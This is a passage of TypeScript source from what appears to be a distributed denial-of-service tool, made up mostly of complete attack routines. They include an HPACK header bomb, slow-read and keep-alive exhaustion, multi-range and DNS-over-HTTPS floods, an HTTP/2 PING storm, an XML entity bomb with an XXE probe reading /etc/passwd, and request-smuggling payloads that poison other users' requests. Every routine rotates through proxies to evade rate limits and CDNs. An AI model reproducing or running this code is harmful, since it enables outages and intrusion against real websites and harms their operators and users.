  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));

  // HPACK 7-bit integer string encoding without Huffman (length prefix + raw bytes)
  const hpackStr = (s: Buffer): Buffer => {
    const len = s.length;
    if (len < 128) return Buffer.concat([Buffer.from([len]), s]);
    // Multi-byte length encoding for strings 128–255 bytes
    return Buffer.concat([Buffer.from([0x7f, len - 127]), s]);
  };

  // Literal Header Field with Incremental Indexing — New Name (RFC 7541 §6.2.1, type=0x40)
  // MUST be added to server's dynamic HPACK table → eviction storm when table fills
  const makeBombHeader = (): Buffer => {
    const nameLen  = randInt(4,  22);
    const valueLen = randInt(12, 80);
    const name  = Buffer.allocUnsafe(nameLen);
    const value = Buffer.allocUnsafe(valueLen);
    for (let i = 0; i < nameLen;  i++) name[i]  = 0x61 + randInt(0, 26); // lowercase a-z only
    for (let i = 0; i < valueLen; i++) value[i]  = 0x21 + randInt(0, 94); // printable ASCII
    return Buffer.concat([Buffer.from([0x40]), hpackStr(name), hpackStr(value)]);
  };

  // Build HEADERS frame with Chrome pseudo-headers + N bomb headers (END_HEADERS|END_STREAM)
  const authBuf       = Buffer.from(hostname);
  const staticPseudo  = Buffer.concat([
    Buffer.from([0x82, 0x84, 0x87]),  // :method=GET, :path=/, :scheme=https (indexed)
    Buffer.from([0x41]),              // :authority — Literal Incremental, static name idx 1
    hpackStr(authBuf),
  ]);

  const makeHPACKBombFrame = (streamId: number): Buffer => {
    const bombHdrs = Buffer.concat(
      Array.from({ length: randInt(50, 150) }, () => makeBombHeader())
    );
    return mkFrame(0x01, 0x05, streamId, Buffer.concat([staticPseudo, bombHdrs]));
    // 0x01=HEADERS  0x05=END_HEADERS|END_STREAM
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  const oneHpack = async (): Promise<void> => {
    if (signal.aborted) return;
    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
    sock.setTimeout(30_000);
    return new Promise<void>(resolve => {
    let settled = false;
    const done  = () => { if (!settled) { settled = true; resolve(); } };

    // Backpressure-aware write: HPACK bomb frames are large (up to 1.2MB each);
    // writing without checking backpressure causes OOM via unbounded buffer growth.
    // IMPORTANT: also resolves on socket close/error so the promise never leaks.
    const safeWrite = (buf: Buffer): Promise<void> => {
      if (sock.destroyed) return Promise.resolve();
      const ok = sock.write(buf);
      if (ok) return Promise.resolve();
      return new Promise<void>(r => {
        if (sock.destroyed) { r(); return; }
        const cleanup = () => { sock.off("drain", cleanup); sock.off("error", cleanup); sock.off("close", cleanup); r(); };
        sock.once("drain", cleanup);
        sock.once("error", cleanup);
        sock.once("close", cleanup);
      });
    };

    sock.once("secureConnect", () => {
      sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
      localPkts++; localBytes += PREFACE.length + 18;

      let streamId = 1;

      // Async attack loop: write one HPACK bomb frame per iteration with backpressure.
      // Each frame contains 50-150 huge literal headers → forces server to expand HPACK
      // dynamic table and allocate memory for each header value (BOMB_VAL_SIZE bytes each).
      const attack = async (): Promise<void> => {
        while (!signal.aborted && !sock.destroyed) {
          if (streamId > 0x7fffff00) { sock.destroy(); done(); return; }
          const frame = makeHPACKBombFrame(streamId);
          await safeWrite(frame); // wait for drain if kernel buffer full
          localPkts++; localBytes += frame.length;
          streamId += 2; // client-initiated streams use odd IDs
          await new Promise<void>(r => setImmediate(r)); // yield to event loop
        }
        done();
      };
      attack().catch(() => done());
    });

    sock.on("data",    () => {});  // drain server responses (SETTINGS ACK, RST, etc.)
    sock.on("timeout", () => { sock.destroy(); done(); });
    sock.on("error",   () => { done(); });
    sock.on("close",   () => { done(); });
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
    }); // end inner Promise
  }; // end oneHpack

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneHpack();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SLOW READ — TCP slow-read attack
//
//  Establishes real HTTP/HTTPS connections, sends a valid request, then
//  pauses reading (socket.pause()). The server's TCP send buffer fills up
//  and the server's send thread/goroutine stays blocked indefinitely.
//  Extremely effective against Apache, Tomcat, IIS.
//  (Nginxlimits this to ~60s via proxy_read_timeout, but still consumes slots.)
// ─────────────────────────────────────────────────────────────────────────
async function runSlowRead(
  resolvedHost: string, hostname: string, targetPort: number, threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  let localPkts = 0, localBytes = 0, conns = 0, pIdx = 0;
  const flush   = () => { onStats(localPkts, localBytes, conns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const oneConn = async (): Promise<void> => {
    if (signal.aborted) return;
    let readIv: NodeJS.Timeout | null = null;
    let holdTimer: NodeJS.Timeout | null = null;
    try {
      // mkTLSSock — routes through proxy so each slow connection comes from a different IP
      const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
      sock.setNoDelay(true);
      conns++;
      localPkts++;

      await new Promise<void>((resolve) => {
        const done = () => {
          conns = Math.max(0, conns - 1);
          if (readIv)    { clearInterval(readIv);   readIv    = null; }
          if (holdTimer) { clearTimeout(holdTimer);  holdTimer = null; }
          try { sock.destroy(); } catch { /**/ }
          resolve();
        };
        // Complete request — server starts sending response and fills its send buffer
        const req = [
          `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1,999999)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${randUA()}`,
          `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8`,
          `Accept-Encoding: gzip, deflate, br, zstd`,
          `Accept-Language: en-US,en;q=0.9`,
          `Connection: keep-alive`,
          `\r\n`,
        ].join("\r\n");
        sock.write(req);
        localBytes += req.length;
        // Pause reading immediately — server's send buffer fills up and thread blocks
        sock.pause();
        // Drip-read 1 byte every 500ms (was 600ms) to prevent server FIN while still blocking
        readIv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { done(); return; }
          try {
            const chunk = sock.read(1);
            if (chunk) { localBytes += 1; }
          } catch { done(); }
        }, 500);
        // Hold for up to 90s — forces server thread to remain allocated the whole time
        holdTimer = setTimeout(done, 90_000);
        sock.on("error",   done);
        sock.on("close",   done);
        sock.setTimeout(120_000);
        sock.on("timeout", done);
        signal.addEventListener("abort", done, { once: true });
      });
    } catch { /* proxy/socket failed — reconnect immediately */ }
  };

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      // No sleep — slots cycle immediately after connection closes
    }
  };
  const numSlots = IS_DEPLOYED
    ? Math.min(Math.max(40, threads * 2), 2000)
    : Math.max(20, threads);
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP RANGE FLOOD — multi-range request exhaustion
//
//  HTTP Range: bytes=0-0,1-1,...,499-499 forces server to:
//  1. Validate ALL ranges against the resource (disk/memory seek × 500)
//  2. Build a multipart/byteranges response with 500 parts
//  3. Each part adds its own MIME headers (CPU + memory)
//  Effective against: nginx, Apache, CDN edge servers with byte-serving.
// ─────────────────────────────────────────────────────────────────────────
async function runRangeFlood(
  base: string, threads: number, proxies: ProxyConfig[], signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Multiple range variants — different sizes stress different server codepaths
  const RANGES = [
    Array.from({ length: 500 }, (_, i) => `${i}-${i}`).join(","),            // 500 × 1-byte  (heaviest)
    Array.from({ length: 300 }, (_, i) => `${i*3}-${i*3+2}`).join(","),      // 300 × 3-byte
    Array.from({ length: 200 }, (_, i) => `${i*5}-${i*5+4}`).join(","),      // 200 × 5-byte
    Array.from({ length: 128 }, (_, i) => `${i*8}-${i*8+7}`).join(","),      // 128 × 8-byte
    "0-0,1000-1001,2000-2001,3000-3001,4000-4001,5000-5001,6000-6001,7000-7001,8000-8001,9000-9001",
    // Overlapping ranges — forces server to deduplicate
    Array.from({ length: 100 }, (_, i) => `${i*2}-${i*2+10}`).join(","),
  ];

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doReq = async () => {
    if (signal.aborted) return;
    try {
      const range  = RANGES[randInt(0, RANGES.length)];
      const hdrs   = buildHeaders(false) as Record<string, string>;
      hdrs["Range"]         = `bytes=${range}`;
      hdrs["If-Range"]      = new Date(Date.now() - randInt(3600_000, 86400_000)).toUTCString();
      hdrs["Cache-Control"] = "no-cache";
      const url = buildUrl(base);
      // 95% via proxy for IP rotation — range requests bypass CDN when IP changes
      if (proxies.length > 0 && Math.random() < 0.95) {
        const proxy = pickProxy(proxies);
        const bytes = await fetchViaProxy(url, proxy, "GET", hdrs)
          .then(b => { recordProxySuccess(proxy.host, proxy.port); return b; })
          .catch(() => { recordProxyFailure(proxy.host, proxy.port); return 150; });
        localPkts++; localBytes += bytes;
        return;
      }
      const res = await fetch(url, { headers: hdrs, signal: AbortSignal.timeout(5000) });
      localPkts++;
      localBytes += parseInt(res.headers.get("content-length") || "0") || 1024;
      await res.body?.cancel();
    } catch {
      localPkts++; localBytes += 150;
    }
  };

  const numSlots = IS_DEPLOYED
    ? Math.min(Math.max(200, threads * 4), 5000)
    : Math.max(60, threads);
  const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  XML BOMB / XXE DoS — XML entity expansion exhaustion
//
//  POST billion-laughs-lite payload to XML/SOAP/XMLRPC endpoints.
//  If the server parses XML without entity limits, the parser will expand
//  &d; → 16^3 × 64 = 262KB per entity × recursion = GB of memory/CPU.
//  Hits: xmlrpc.php, SOAP endpoints, XML REST APIs, OData.
// ─────────────────────────────────────────────────────────────────────────
async function runXMLBomb(
  base: string, threads: number, proxies: ProxyConfig[], signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Billion-laughs — 5 levels of entity expansion (was 4)
  const XML_BOMB = `<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">\n  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">\n  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">\n  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">\n  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;">\n]>\n<root><data>&e;&e;&e;&e;</data></root>`;

  // SOAP variant with XXE probe
  const SOAP_BOMB = `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n<soapenv:Header/>\n<soapenv:Body><data>&xxe;&b;&b;&b;&b;</data></soapenv:Body>\n</soapenv:Envelope>`;

  // JSON Content-Type bypass — some parsers auto-detect XML inside JSON body
  const buildJSONXMLBomb = (hName: string) =>
    JSON.stringify({ xml: XML_BOMB, action: "parse", host: hName, _t: Date.now() });

  const XML_ENDPOINTS = [
    "/xmlrpc.php", "/api/xml", "/soap", "/webservice", "/api/soap",
    "/services/soap", "/ws", "/api/ws", "/xmlrpc", "/rpc", "/api",
    "/api/v1", "/api/v2", "/WS", "/Service.asmx", "/WebService.asmx",
    "/?wsdl", "/axis2/services", "/OData/", "/odata/",
    "/api/v3", "/graphql", "/api/graphql", "/api/upload", "/api/import",
  ];

  const hName = (() => { try { return new URL(base).hostname; } catch { return base; } })();
  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doReq = async () => {
    if (signal.aborted) return;
    const variant  = Math.random();
    const payload  = variant < 0.6 ? XML_BOMB : variant < 0.85 ? SOAP_BOMB : buildJSONXMLBomb(hName);
    const isSoap   = payload === SOAP_BOMB;
    const isJson   = payload.startsWith("{");
    const endpoint = XML_ENDPOINTS[randInt(0, XML_ENDPOINTS.length)];
    const url      = new URL(endpoint, base).toString();
    const hdrs: Record<string, string> = {
      ...(buildHeaders(true, payload.length) as Record<string, string>),
      "Content-Type":   isJson ? "application/json" : (isSoap ? "text/xml; charset=utf-8" : "application/xml"),
      "SOAPAction":     `"http://${hName}/service"`,
      "Content-Length": String(payload.length),
    };
    try {
      // 95% via proxy — IP rotation bypasses per-IP XML endpoint rate limits
      if (proxies.length > 0 && Math.random() < 0.95) {
        const proxy = pickProxy(proxies);
        const bytes = await fetchViaProxy(url, proxy, "POST", hdrs, payload)
          .then(b => { recordProxySuccess(proxy.host, proxy.port); return b; })
          .catch(() => { recordProxyFailure(proxy.host, proxy.port); return payload.length; });
        localPkts++; localBytes += bytes;
        return;
      }
      const res = await fetch(url, {
        method: "POST", headers: hdrs, body: payload, signal: AbortSignal.timeout(4000),
      });
      localPkts++;
      localBytes += payload.length;
      await res.body?.cancel();
    } catch {
      localPkts++; localBytes += payload.length;
    }
  };

  const numSlots = IS_DEPLOYED
    ? Math.min(Math.max(150, threads * 3), 3000)
    : Math.max(40, threads);
  const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 PING STORM — PING frame exhaustion
//
//  Every HTTP/2 PING frame MUST be ACK'd by the server (RFC 7540 §6.7).
//  Sending thousands of PINGs per second forces the server to:
//  1. Parse each PING frame (context switch per frame)
//  2. Allocate a PING ACK frame response
//  3. Write the ACK to the connection's write queue
//  Results in massive CPU + network overhead per connection.
// ─────────────────────────────────────────────────────────────────────────
async function runH2PingStorm(
  resolvedHost: string, hostname: string, targetPort: number, threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  // H2 PING frame: 9-byte header + 8-byte opaque data = 17 bytes
  // Prelude: client connection preface + SETTINGS frame
  const H2_CLIENT_PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  // SETTINGS frame (type=0x4, flags=0x0, stream=0, no params)
  const H2_SETTINGS       = Buffer.from([0,0,0, 4, 0, 0,0,0,0]);
  // SETTINGS ACK (type=0x4, flags=0x1, stream=0, no payload)
  const H2_SETTINGS_ACK   = Buffer.from([0,0,0, 4, 1, 0,0,0,0]);

  function buildPing(opaque?: Buffer): Buffer {
    const frame = Buffer.allocUnsafe(17);
    frame.writeUInt32BE(0x00000008, 0); // length=8, type=6 (PING)
    frame[3] = 0x06;                    // type=PING
    frame[4] = 0x00;                    // flags=0 (not ACK — forces server to ACK)
    frame.writeUInt32BE(0, 5);          // stream id=0
    if (opaque) opaque.copy(frame, 9);
    else        (opaque = Buffer.allocUnsafe(8), opaque.fill(Math.random() * 255 | 0), opaque.copy(frame, 9));
    return frame;
  }

  // Pre-build 256 PING frames with random opaque data for fast cycling
  const PING_POOL = Array.from({ length: 256 }, () => buildPing());

  let localPkts = 0, localBytes = 0, localConns = 0;
  const flush   = () => { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  let pIdx = 0;
  const onePingConn = async (): Promise<void> => {
    if (signal.aborted) return;
    let pingIv: NodeJS.Timeout | null = null;
    let sock: tls.TLSSocket | null = null;
    try {
      // mkTLSSock routes through SOCKS5/HTTP proxy — each conn from a different IP
      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
      localConns++;

      await new Promise<void>((resolve) => {
        const done = () => {
          if (pingIv) { clearInterval(pingIv); pingIv = null; }
          localConns = Math.max(0, localConns - 1);
          try { sock?.destroy(); } catch { /**/ }
          resolve();
        };
        // Send preface + initial SETTINGS immediately
        sock!.write(Buffer.concat([H2_CLIENT_PREFACE, H2_SETTINGS, H2_SETTINGS_ACK]));
        localPkts++;
        localBytes += H2_CLIENT_PREFACE.length + H2_SETTINGS.length + H2_SETTINGS_ACK.length;

        // Blast 100 PING frames every 3ms (was 50 every 5ms) = ~33K PINGs/s per conn
        pingIv = setInterval(() => {
          if (signal.aborted || sock!.destroyed) { done(); return; }
          const frames = Buffer.concat(Array.from({ length: 100 }, () => PING_POOL[randInt(0, PING_POOL.length)]));
          sock!.write(frames);
          localPkts += 100;
          localBytes += 17 * 100;
        }, 3);
        // Cycle connection every 25s
        setTimeout(done, 25_000);
        sock!.on("data",    () => {});
        sock!.on("error",   done);
        sock!.on("close",   done);
        sock!.setTimeout(30_000);
        sock!.on("timeout", done);
        signal.addEventListener("abort", done, { once: true });
      });
    } catch { /* proxy/socket failed — reconnect immediately */ }
  };

  const runSlot = async () => {
    while (!signal.aborted) {
      await onePingConn();
      // No artificial delay — immediate reconnect
    }
  };
  const numSlots = IS_DEPLOYED
    ? Math.min(Math.max(50, threads * 2), 2000)
    : Math.max(30, threads);
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP REQUEST SMUGGLING — TE/CL desync
//
//  Sends requests with both Transfer-Encoding: chunked and Content-Length
//  that disagree, exploiting HA/load-balancer parsing inconsistencies.
//  Front-end sees CL=6, back-end sees chunked — "GPOST" prefix leaks into
//  the next victim's request, poisoning the request queue.
//  (RFC 7230 §3.3.3: if both present, TE wins — but many servers disagree)
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPSmuggling(
  resolvedHost: string, hostname: string, targetPort: number, threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  // CL.TE variant: front-end uses Content-Length (sees 6 bytes), back-end uses TE (sees full body)
  // The "GPOST" prefix poisons the next queued request on the back-end connection.
  const buildSmuggle = () => {
    const path = hotPath();
    const poison = `GET /admin HTTP/1.1\r\nHost: ${hostname}\r\nContent-Length: 0\r\n\r\n`;
    const chunk = poison.length.toString(16);
    return [
      `POST ${path} HTTP/1.1\r\n`,
      `Host: ${hostname}\r\n`,
      `User-Agent: ${randUA()}\r\n`,
      `Content-Type: application/x-www-form-urlencoded\r\n`,
      `Content-Length: ${String(poison.length + chunk.length + 5)}\r\n`,
      `Transfer-Encoding: chunked\r\n`,
      `Connection: keep-alive\r\n`,
      `\r\n`,
      `${chunk}\r\n${poison}\r\n`,
      `0\r\n\r\n`,
    ].join("");
  };

  // TE.CL variant: front-end uses TE (sees 0-length body), back-end uses CL (sees leftover data)
  const buildSmuggleTE = () => {
    const path = hotPath();
    const poison = `SMUGGLED / HTTP/1.1\r\nHost: ${hostname}\r\nContent-Length: 0\r\n\r\n`;
    return [
      `POST ${path} HTTP/1.1\r\n`,
      `Host: ${hostname}\r\n`,
      `User-Agent: ${randUA()}\r\n`,
      `Content-Length: ${poison.length + 4}\r\n`,
      `Transfer-Encoding:\x20chunked\r\n`,  // space trick for obfuscation
      `Connection: keep-alive\r\n`,
      `\r\n`,
      `0\r\n\r\n`,
      poison,
    ].join("");
  };

  // H2.CL variant: smuggle via HTTP/2 downgrade + CL mismatch
  const buildSmuggleH2 = () => {
    const path = hotPath();
    const smuggled = `GET /secret HTTP/1.1\r\nHost: ${hostname}\r\nX-Smuggled: true\r\n\r\n`;
    return [
      `POST ${path} HTTP/1.1\r\n`,
      `Host: ${hostname}\r\n`,
      `User-Agent: ${randUA()}\r\n`,
      `Content-Length: ${smuggled.length}\r\n`,
      `Content-Type: application/x-www-form-urlencoded\r\n`,
      `Connection: keep-alive\r\n`,
      `X-Accel-Buffering: no\r\n`,
      `\r\n`,
      smuggled,
    ].join("");
  };

  let localPkts = 0, localBytes = 0, localConns = 0, pIdx = 0;
  const flush   = () => { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const oneConn = async (): Promise<void> => {
    if (signal.aborted) return;
    try {
      // mkTLSSock with HTTP/1.1 ALPN — ensures we get the HTTP/1.1 path (required for smuggling)
      const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
      sock.setNoDelay(true);
      localConns++;

      await new Promise<void>((resolve) => {
        const done = () => {
          localConns = Math.max(0, localConns - 1);
          try { sock.destroy(); } catch { /**/ }
          resolve();
        };
        // Send 12 smuggle variants (was 8) in one keep-alive connection
        const variant = Math.random();
        for (let i = 0; i < 12; i++) {
          const pkt = variant < 0.4 ? buildSmuggle() : variant < 0.75 ? buildSmuggleTE() : buildSmuggleH2();
          sock.write(pkt);
          localPkts++;
          localBytes += pkt.length;
        }
        setTimeout(done, randInt(1500, 3000)); // was 2000-5000
        sock.on("data",    () => { localBytes += 100; });
        sock.on("error",   done);
        sock.on("close",   done);
        sock.setTimeout(6000);
        sock.on("timeout", done);
        signal.addEventListener("abort", done, { once: true });
      });
    } catch { /* proxy/socket failed */ }
  };

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      // No sleep — immediate reconnect
    }
  };
  const numSlots = IS_DEPLOYED
    ? Math.min(Math.max(60, threads * 2), 3000)
    : Math.max(30, threads);
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  DNS OVER HTTPS (DoH) FLOOD — /dns-query endpoint exhaustion
//
//  Floods DNS-over-HTTPS endpoint with random DNS queries.
//  Forces resolver to perform recursive DNS lookups for random domains,
//  exhausting DNS resolver thread pool + upstream DNS bandwidth.
//  Effective against: Cloudflare DoH, servers with nginx-dns-module,
//  any server running a DNS resolver (1.1.1.1, 8.8.8.8 proxy, etc.)
// ─────────────────────────────────────────────────────────────────────────
async function runDoHFlood(
  base: string, threads: number, proxies: ProxyConfig[], signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const DOH_PATHS = [
    "/dns-query", "/resolve", "/dns", "/dns-query?type=A",
    "/dns-query?type=AAAA", "/dns-query?type=MX", "/dns-query?type=TXT",
    "/api/doh", "/.well-known/dns", "/dns-over-https",
    "/dns-over-https/google-format", "/dns/lookup",
  ];

  // QTYPE variants — A, AAAA, MX, TXT each triggers different resolver paths
  const QTYPES: [number, number][] = [
    [0, 1],   // A (IPv4)
    [0, 28],  // AAAA (IPv6)
    [0, 15],  // MX (mail)
    [0, 16],  // TXT (text)
    [0, 255], // ANY — heaviest, triggers all record types
  ];

  // Build a real DNS wire-format query for a random subdomain
  const buildDNSQuery = (domain: string, qtype: [number, number] = [0, 1]): Buffer => {
    const labels = domain.split(".");
    const qname  = Buffer.alloc(labels.reduce((a, l) => a + l.length + 1, 0) + 1);
    let off = 0;
    for (const label of labels) {
      qname[off++] = label.length;
      qname.write(label, off);
      off += label.length;
    }
    qname[off] = 0;
    const header = Buffer.from([
      randInt(0, 0xFF), randInt(0, 0xFF), // random ID
      0x01, 0x00, // Flags: RD=1 (recursive desired)
      0x00, 0x01, // QDCOUNT=1
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ]);
    const question = Buffer.concat([qname, Buffer.from([...qtype, 0, 1])]); // QCLASS=IN
    return Buffer.concat([header, question]);
  };

  // Also build GET-style DoH query (base64url-encoded DNS wire)
  const buildGetQuery = (domain: string): string => {
    const wire = buildDNSQuery(domain, [0, 255]);
    return wire.toString("base64url").replace(/=/g, "");
  };

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doReq = async () => {
    if (signal.aborted) return;
    // Random deep subdomain — forces recursive resolution, can't be cached
    const tld    = ["com","net","org","io","co","uk","de","fr","jp"][randInt(0,9)];
    const domain = `${randStr(randInt(8,16))}.${randStr(randInt(4,10))}.${randStr(randInt(4,8))}.${tld}`;
    const qtype  = QTYPES[randInt(0, QTYPES.length)];
    const useGet = Math.random() < 0.3; // 30% GET (RFC 8484 §4.1), 70% POST
    const path   = DOH_PATHS[randInt(0, DOH_PATHS.length)];
    const url    = useGet
      ? new URL(`${path}?dns=${buildGetQuery(domain)}`, base).toString()
      : new URL(path, base).toString();
    const dnsWire = buildDNSQuery(domain, qtype);
    const hdrs: Record<string, string> = {
      "Content-Type":  "application/dns-message",
      "Accept":        "application/dns-message, */*",
      "User-Agent":    randUA(),
      "Cache-Control": "no-cache, no-store",
    };
    try {
      // 95% via proxy — forces resolver to do recursive lookup from different IP each time
      if (proxies.length > 0 && Math.random() < 0.95) {
        const proxy = pickProxy(proxies);
        const bytes = await fetchViaProxy(url, proxy, useGet ? "GET" : "POST", hdrs, useGet ? undefined : dnsWire.toString("binary"))
          .then(b => { recordProxySuccess(proxy.host, proxy.port); return b; })
          .catch(() => { recordProxyFailure(proxy.host, proxy.port); return dnsWire.length; });
        localPkts++; localBytes += bytes;
        return;
      }
      const res = await fetch(url, {
        method:  useGet ? "GET" : "POST",
        headers: hdrs,
        ...(useGet ? {} : { body: dnsWire }),
        signal:  AbortSignal.timeout(3000),
      });
      localPkts++;
      localBytes += dnsWire.length + (parseInt(res.headers.get("content-length") || "0") || 100);
      await res.body?.cancel();
    } catch {
      localPkts++; localBytes += dnsWire.length;
    }
  };

  const numSlots = IS_DEPLOYED
    ? Math.min(Math.max(200, threads * 4), 5000)
    : Math.max(50, threads);
  const runSlot = async () => { while (!signal.aborted) { await doReq(); } };
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  KEEPALIVE EXHAUST — HTTP/1.1 persistent connection exhaustion
//
//  Opens keep-alive connections and pipelines 128 requests per connection
//  in a burst without waiting for responses. Server must process all queued
//  requests before closing. Combined with large POST bodies, this saturates
//  the server's keep-alive connection pool (MaxKeepAliveRequests limit).
// ─────────────────────────────────────────────────────────────────────────
async function runKeepaliveExhaust(
  resolvedHost: string, hostname: string, targetPort: number, threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
): Promise<void> {
  const PIPELINE_DEPTH = IS_DEPLOYED ? 256 : 128; // requests per connection (was always 128)

  let localPkts = 0, localBytes = 0, conns = 0, pIdx = 0;
  const flush   = () => { onStats(localPkts, localBytes, conns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const buildKeepalivePipeline = (depth: number): string => {
    const reqs: string[] = [];
    for (let i = 0; i < depth; i++) {
      const isPost = Math.random() < 0.3;
      const body   = isPost ? buildBody(10, 40) : "";
      const method = isPost ? "POST" : (Math.random() < 0.7 ? "GET" : "HEAD");
      const hdrs   = [
        `${method} ${hotPath()}?_=${randStr(6)}&v=${randInt(0,99999)} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Accept: */*`,
        `Accept-Encoding: gzip, deflate, br`,
        `Connection: keep-alive`,
        isPost ? `Content-Type: application/x-www-form-urlencoded` : "",
        isPost ? `Content-Length: ${body.length}` : "",
        ``,
        body,
      ].filter(l => l !== "").join("\r\n");
      reqs.push(hdrs);
    }
    return reqs.join("\r\n") + "\r\n";
  };

  const oneConn = async (): Promise<void> => {
    if (signal.aborted) return;
    try {
      // mkTLSSock routes through SOCKS5/HTTP proxy — each pipelined burst from different IP
      const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
      sock.setNoDelay(true);
      conns++;

      await new Promise<void>((resolve) => {
        const done = () => {
          conns = Math.max(0, conns - 1);
          try { sock.destroy(); } catch { /**/ }
          resolve();
        };
        const pipeline = buildKeepalivePipeline(PIPELINE_DEPTH);
        sock.write(pipeline);
        localPkts  += PIPELINE_DEPTH;
        localBytes += pipeline.length;
        sock.resume();
        // Hold 10-20s (was 15-30s) for tighter cycling = more total pipelined bursts
        setTimeout(done, randInt(10_000, 20_000));
        sock.on("data",    () => { localBytes += 200; });
        sock.on("error",   done);
        sock.on("close",   done);
        sock.setTimeout(25_000);
        sock.on("timeout", done);
        signal.addEventListener("abort", done, { once: true });
      });
    } catch { /* proxy/socket failed — reconnect immediately */ }
  };

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      // No sleep — immediate reconnect maximizes pipeline throughput
    }
  };
  const numSlots = IS_DEPLOYED
    ? Math.min(Math.max(60, threads * 2), 3000)
    : Math.max(20, threads);
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  APP SMART FLOOD — POST to high-cost endpoints, forces DB query per req
// ─────────────────────────────────────────────────────────────────────────
const SMART_ENDPOINTS = [
  // Auth — always uncacheable, forced DB query per request
  "/login", "/signin", "/auth/login", "/auth/session", "/auth/callback",
